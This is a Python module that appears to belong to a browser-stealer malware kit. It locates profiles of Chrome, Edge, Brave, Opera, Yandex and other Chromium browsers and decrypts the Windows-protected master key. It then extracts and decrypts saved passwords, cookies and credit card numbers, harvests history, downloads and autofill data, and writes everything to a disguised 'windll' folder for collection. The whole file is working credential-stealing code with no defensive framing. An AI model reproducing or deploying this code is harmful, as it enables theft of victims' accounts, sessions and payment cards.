import os
import glob
import base64
import json
from win32crypt import CryptUnprotectData
from manager.logger import Log
from shutil import copy2
from sqlite3 import connect
from Crypto.Cipher import AES
from datetime import datetime, timedelta

logins = ''''''
cookies = ''''''
history = ''''''
downhistory = ''''''
cards = ''''''
autofills = ''''''
listData = []

def get_master_key(path: str):
    if not os.path.exists(path):
        return None
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        c = f.read()
    if 'os_crypt' not in c:
        return None
    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    
    return master_key

def decrypt_payload(cipher, payload):
    try:
        return cipher.decrypt(payload)
    except:
        pass


def generate_cipher(aes_key, iv):
    try:
        return AES.new(aes_key, AES.MODE_GCM, iv)
    except:
        pass


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  
        return decrypted_pass
    except:
        return "Chrome < 80"    


def get_login_data(path, master_key, blink = False):
        try:
            global logins
            if not blink:
                num = path.rfind("\\")
                profile = path[num+1:]
                logins += f"===============================\n\n\n{profile}:\n\n"
            login_db = f'{path}\\Login Data'
            copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db') 
            conn = connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
            cursor = conn.cursor()

        
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)

                alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
                logins += alldatapass
            try:
                os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\Loginvault.db')
            except:
                pass
        except Exception as e:
            Log(f"{path} logins ---> {e}")

def time(date):
    try:
        return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
    except:
        return "Can't decode"

def get_web_history(path, blink = False):
    try:
        global history
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            history += f"===============================\n\n\n{profile}:\n\n"
        HistorySQL = "SELECT url FROM visits"
        HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"
        history_db = os.path.join(path, 'history')
        copy2(history_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
        c = connect(os.environ['USERPROFILE']+ '\\AppData\\Roaming\\history.db')
        cursor = c.cursor()
        for result in cursor.execute(HistorySQL).fetchall():
            data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
            result = f"URL: {data[0]}\nTitle: {data[1]}\nVisit Time: {time(data[2])}\n\n"
            if result in history:
                continue
            history += result
        try:
            os.remove(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\history.db')
        except:
            pass
    except Exception as e:
        Log(f"{path} history ---> {e}")


def get_downloads(path, blink = False):
    try:
        global downhistory
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            downhistory += f"===============================\n\n\n{profile}:\n\n"
        downloads_db = f'{path}\\History'
        if not os.path.exists(downloads_db):
            return
        copy2(downloads_db, os.path.dirname(path)+'\\downloads_db')
        conn = connect(os.path.dirname(path)+'\\downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            downhistory += f"""
Download URL: {row[0]}
Local Path: {row[1]}
"""
        conn.close()
        try:
            os.remove(os.path.dirname(path)+'\\downloads_db')
        except:
            pass
    except Exception as e:
        Log(f"{path} downhistory ---> {e}")

def get_cookies(path, master_key, blink = False):
    try:
        global cookies
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            cookies += f"===============================\n\n\n{profile}:\n\n"
        cookie_db = path + '\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return None
        copy2(cookie_db, os.path.dirname(path)+'\\cookie_db')
        conn = connect(os.path.dirname(path)+'\\cookie_db')
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, path, datetime(expires_utc/1000000,'unixepoch') as expires_utc, name, encrypted_value FROM cookies")
        for row in cursor.fetchall():
            if not all(row[:4]):
                continue

            cookie_value = decrypt_password(row[4], master_key)
            cookie_line = f"{row[0]}\tTRUE\t{row[2]}\tFALSE\t{row[4]}\t{row[1]}\t{cookie_value}"
            cookies += cookie_line + "\n\n"
        conn.close()
        try:
            os.remove(os.path.dirname(path)+'\\cookie_db')
        except:
            pass
    except Exception as e:
        Log(f"{path} cookies ---> {e}")

def get_autofils(path, blink = False):
    try:
        global autofills
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            autofills += f"===============================\n\n\n{profile}:\n\n"
        webdata = f'{path}\\Web Data'
        if not os.path.exists(webdata):
            return
        copy2(webdata, os.path.dirname(path)+'\\Web Data')
        conn = connect(os.path.dirname(path)+'\\Web Data')
        cursor = conn.cursor()
        cursor.execute('SELECT name, value FROM autofill')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            autofills += f"""
Name: {row[0]}
Value: {row[1]}
"""
        conn.close()
        try:
            os.remove(os.path.dirname(path)+'\\Web Data')
        except:
            pass
    except Exception as e:
        Log(f"{path} autofils ---> {e}")


def get_credit_cards(path, master_key, blink = False):
    try:
        global cards
        if not blink:
            num = path.rfind("\\")
            profile = path[num+1:]
            cards += f"===============================\n\n\n{profile}:\n\n"
        cards_db = f'{path}\\Web Data'
        if not os.path.exists(cards_db):
            return
        copy2(cards_db, os.path.dirname(path)+'\\cards_db')
        conn = connect(os.path.dirname(path)+'\\cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue
            card_number = decrypt_password(row[3], master_key)
            cards += f"""
Name On Card: {row[0]}
Card Number: {card_number}
Expires On:  {row[1]} / {row[2]}
Added On: {datetime.fromtimestamp(row[4])}
"""
        conn.close()
        try:
            os.remove(os.path.dirname(path)+'\\cards_db')
        except:
            pass
    except Exception as e:
        Log(f"{path} cards ---> {e}")

def Write(pathToLogs, browser):
    global logins
    global cookies
    global history
    global downhistory
    global cards
    global autofills
    colected = False

    if logins or cookies or history or downhistory or cards or autofills:
        try:
            listData.append(f"\n🔍{browser}")
            os.makedirs(f"{pathToLogs}\\{browser}")
            colected = True
        except:
            pass


    if(logins):
        with open(rf"{pathToLogs}\\{browser}\\logins.txt", "w", encoding="utf-8") as f:
                f.write(logins)
        f.close()
        listData.append("\n∟🔑logins")
    
    if(history):
        with open(rf"{pathToLogs}\\{browser}\\history.txt", "w", encoding="utf-8") as f:
                f.write(history)
        f.close()
        listData.append("\n∟📰history")
    
    if(downhistory):
        with open(rf"{pathToLogs}\\{browser}\\downhistory.txt", "w", encoding="utf-8") as f:
                f.write(downhistory)
        f.close()
        listData.append("\n∟📥downhistory")
    
    if(cookies):
        with open(rf"{pathToLogs}\\{browser}\\cookies.txt", "w", encoding="utf-8") as f:
                f.write(cookies)
        f.close()
        listData.append("\n∟🍪cookies")
    
    if(autofills):
        with open(rf"{pathToLogs}\\{browser}\\autofills.txt", "w", encoding="utf-8") as f:
                f.write(autofills)
        f.close()
        listData.append("\n∟⌨autofills")
    
    if(cards):
        with open(rf"{pathToLogs}\\{browser}\\cards.txt", "w", encoding="utf-8") as f:
                f.write(cards)
        f.close()
        listData.append("\n∟💳cards")
        
    if colected:
        listData.append("\n")
    
    logins = ''''''
    cookies = ''''''
    history = ''''''
    downhistory = ''''''
    cards = ''''''
    autofills = ''''''

def Chromium():
    global logins
    global cookies
    global history
    global downhistory
    global cards
    global autofills
    global listData

    Log("===========Chromium===========")
    listData.append("\n**🌐Browsers🌐**")

    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    pathToLogs = f"{local}\\windll\\Browsers"

    browsers = {
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data',
        'Chrome_SXS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': local + '\\Google\\Chrome\\User Data',
        'EpicPrivacyBrowser': local + '\\Epic Privacy Browser\\User Data',
        'Edge': local + '\\Microsoft\\Edge\\User Data',
        'Uran': local + '\\uCozMedia\\Uran\\User Data',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data',
        'Iridium': local + '\\Iridium\\User Data'
    }

    blink_directory = {
        'Opera': local + '\\Opera Software\\Opera Stable\\',
        'Opera_2': roaming + '\\Opera Software\\Opera Stable\\',
        'OperaGX': local + '\\Programs\\Opera GX\\',
    }

    for key, value in browsers.items():
        master_key = get_master_key(value)
        matching_folders = glob.glob(os.path.join(value, "Default"))
        buff = glob.glob(os.path.join(value, "Profile*"))
        for profile in buff:
            matching_folders.append(profile)

        if (matching_folders):
            for profile_path in matching_folders:
                try:
                    get_login_data(profile_path, master_key)
                    get_web_history(profile_path)
                    get_downloads(profile_path)
                    get_cookies(profile_path, master_key)
                    get_autofils(profile_path)
                    get_credit_cards(profile_path, master_key)
                except Exception as error:
                    Log(f"{profile_path} ---> {error}")
                    pass
            Write(pathToLogs, key)
    
    for key, value in blink_directory.items():
        master_key = get_master_key(value)
        get_login_data(value, master_key, True)
        get_web_history(value, True)
        get_downloads(value, True)
        get_cookies(value, master_key, True)
        get_credit_cards(value, master_key, True)
        get_autofils(value, True)
        Write(pathToLogs, key)
    
    return listData